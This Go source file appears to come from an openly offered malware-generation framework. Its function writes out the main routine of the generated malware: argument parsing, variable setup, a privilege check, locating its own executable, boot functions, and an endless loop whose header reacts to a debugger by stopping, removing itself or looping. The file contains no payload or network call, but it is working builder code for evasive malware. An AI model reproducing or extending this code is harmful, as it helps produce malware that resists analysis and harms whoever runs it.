package generate

import (
	"fmt"

	"github.com/TeamPhoneix/go-evil/utility/structure"
)

// Generates the main function of the malware
func Generate_main(s_json string, boot_functions []string, loop_functions []string) string {
	data_object := structure.Receive(s_json)

	// Create the main function here
	main_functions := []string{"func main(){"}

	// Adds all arguments
	main_functions = append(main_functions, "arguments.Argument_add(\"--verbose\", \"-v\", false, \"Show all generated logs during runtime\")", "parsed := arguments.Argument_parse()")
	main_functions = append(main_functions, "if _, ok := parsed[\"-v\"]; ok{", "spine.logging_lvl = \"3\"", "}")

	main_functions = append(main_functions, fmt.Sprintf("spine.alpha.alphabet = %s", data_object.Get_alphabet()))

	// Adds all the €1€ - €5€ to the final malware
	main_functions = append(main_functions, fmt.Sprintf("spine.variable.roof = %d", data_object.Var_max))
	main_functions = append(main_functions, "spine.variable.pointer = 0")
	main_functions = append(main_functions, "spine.variable.values = make([]string, spine.variable.roof)")

	for i := 0; i < data_object.Var_max; i++ { // Add default value for each entry
		main_functions = append(main_functions, fmt.Sprintf("spine.variable.values[%d] = \"NULL\"", i))
	}

	// Checks if the malware has any priviliges on boot
	main_functions = append(main_functions, "spine.check_privileges()")

	// Figures out the malwares current position
	main_functions = append(main_functions, "spine.path = tools.Grab_executable_path()")

	// Add boot functions
	for _, boot_name := range boot_functions {
		main_functions = append(main_functions, fmt.Sprintf("%s()", boot_name))
	}

	// Decide the header of the for "infinite" loop
	switch data_object.Debugger_behavior {
	case "stop":
		main_functions = append(main_functions, "for !stop_behavior() {")
	case "remove":
		main_functions = append(main_functions, "for !remove_behavior() {")
	case "none":
		main_functions = append(main_functions, "for {")
	case "loop":
		main_functions = append(main_functions, "for !loop_behavior() {")
	}

	// Add loop function
	for _, loop_name := range loop_functions {
		main_functions = append(main_functions, (fmt.Sprintf("%s()", loop_name)))
	}

	// Add the footer
	main_functions = append(main_functions, "}}")

	data_object.Add_go_function(main_functions)

	data_object.Add_go_import("github.com/s9rA16Bf4/ArgumentParser/go/arguments")

	return structure.Send(data_object)

}
